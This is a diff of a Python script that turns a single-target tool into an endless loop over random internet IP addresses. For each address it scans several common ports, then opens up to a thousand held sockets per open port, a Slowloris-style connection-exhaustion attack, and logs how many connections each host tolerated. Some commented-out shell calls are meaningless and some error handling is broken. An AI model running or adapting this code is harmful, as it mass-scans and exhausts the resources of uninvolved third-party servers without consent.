@@ -2,10 +2,11 @@ import socket
 import random
 import time
 import sys
-# import ssl
+import ssl
 import traceback
 import _thread
 import sqlite3
+from os import system
 
 listOfSockets = list()
 ip = None
@@ -39,6 +40,12 @@ user_agents = [
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
 ]
 
+# def create_openSSL():
+# 	print('openSSL key and cert were created')
+# 	system('openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.pem')
+# 	for i in range(7):
+# 		system(str(10+i))
+
 conn = sqlite3.connect('db.db')
 cursor = conn.cursor()
 try:
@@ -52,8 +59,9 @@ except:
 conn.commit()
 
 def portsCheck(ip):
+
 	open_ports = []
-	for port in [21, 22, 80, 139, 443, 445, 5901, 8080, 8081]:
+	for port in [80, 443, 445, 5901, 8080, 8081]:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 		s.settimeout(0.1)
@@ -64,7 +72,7 @@ def portsCheck(ip):
 			pass
 
 		s.close()
-	print(open_ports)
+
 	return open_ports
 
 
@@ -76,7 +84,8 @@ def socketInit(ip, port):
 	while True:
 		if ip:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.settimeout(2)
+			s.settimeout(1)
+			# time.sleep(0.1)
 			s.connect((ip, port))
 			break
 
@@ -133,20 +142,39 @@ def connection(ip, port, quantityOfSockets=1000):
 	
 	global listOfSockets
 	global thread_kill
+	global cursor
 	thread_kill = False
 	thread = not thread_kill
+
+	# if port == 443:
+	# 	try:
+	# 		f = open('cert.pem', 'r')
+	# 		f.close()
+	# 	except:
+	# 		create_openSSL()
+
+
 
 	for _ in range(quantityOfSockets):
 		try:
 			s = socketInit(ip, port)
+			# if port == 443:
+				# s = ssl.wrap_socket(s, 'cert.pem', 'cert.pem')
 
 		except socket.timeout:
 			break
 		except BrokenPipeError:
-			print('BrokenPipeError: perhaps server closed a port or something with a socket')
+			# print('Error with data: IP - {} Port - {} Socket Index - {}'.format(ip, port, len(listOfSockets)))
+			# print('BrokenPipeError: perhaps server closed a port or something with a socket')
 			continue
+		except KeyboardInterrupt:
+			for s in listOfSockets:
+				s.close()
+				listOfSockets.remove(s)
+				break
 		except:
-			print(traceback.format_exc())
+			# print('Error with data: IP - {} Port - {} Socket Index - {}'.format(ip, port, len(listOfSockets)))
+			# print(traceback.format_exc())
 			continue
 
 		listOfSockets.append(s)
@@ -156,7 +184,7 @@ def connection(ip, port, quantityOfSockets=1000):
 		# 	thread = False
 
 	thread_kill = True
-	time.sleep(0.1)
+	# time.sleep(0.1)
 
 	result = len(listOfSockets)
 
@@ -168,44 +196,68 @@ def connection(ip, port, quantityOfSockets=1000):
 
 	return result
 
+def rand_ip():
+	random_ip = '{}.{}.{}.{}'.format(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
+	return random_ip
+
 	
 
 
 if __name__ == "__main__":
 
-	try:
-		ip = sys.argv[1]
-	except:
-		ip = input('IP: ')
+	# try:
+	# 	ip = sys.argv[1]
+	# except:
+	# 	ip = input('IP: ')
 
 	maximum_sockets = 1000
+	print('Scaning...')
+	counter = 0
+	db_txt = open('db.txt', 'a+')
 
-	# random_ip = '{}.{}.{}.{}'.format(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
-	# ip = random_ip
+	while True:
+		if counter == 0:
+			db_txt.close()
+			conn.commit()
+			db_txt = open('db.txt', 'a+')
 
+		try:
+			ip = rand_ip()
 
-	try:
-		ports = portsCheck(ip)
-	except:
-		ports = []
+			ports = portsCheck(ip)
 
+			for port in ports:
+				print('Scaning IP: {} Port: {}'.format(ip, port))
+				count = connection(ip, port, maximum_sockets)
+				print('End of {}:{} scanning'.format(ip, port))
+				if count == maximum_sockets:
+					count = '>'+str(count) 
+				try:
+					cursor.execute("INSERT INTO checked_ip (ip_address, port, maximum_connections) VALUES (?, ?, ?)", (ip, str(port), str(count)))
+					db_txt.write('{} {} {}'.format(ip, port, count))
+					print('IP - {}, Port - {}, Conn - {}'.format(ip, port, count))
+					conn.commit()
+				except:
+					pass
 
-
-	for port in ports:
-		count = connection(ip, port, maximum_sockets)
-		if count == maximum_sockets:
-			count = '>'+str(count) 
-		cursor.execute("INSERT INTO checked_ip (ip_address, port, maximum_connections) VALUES (?, ?, ?)", (ip, str(port), str(count)))
-
-	conn.commit()
-	cursor.execute("SELECT * from checked_ip")
-	results = cursor.fetchall()
-	for i in results:
-		ip, port, conn = i
-		print('{} - {} - {}'.format(ip, port, conn))
-	cursor.close()
-
-		
+		except KeyboardInterrupt:
+			
+			conn.commit()
+			
+			cursor.execute("SELECT * from checked_ip")
+			results = cursor.fetchall()
+			for i in results:
+				ip, port, conn = i
+				print('{} - {} - {}'.format(ip, port, conn))
+			cursor.close()
+			break
+		except:
+			print(traceback.format_exc())
+			continue
+		if counter != 10:
+			counter += 1
+		else:
+			counter = 0
 
 
 
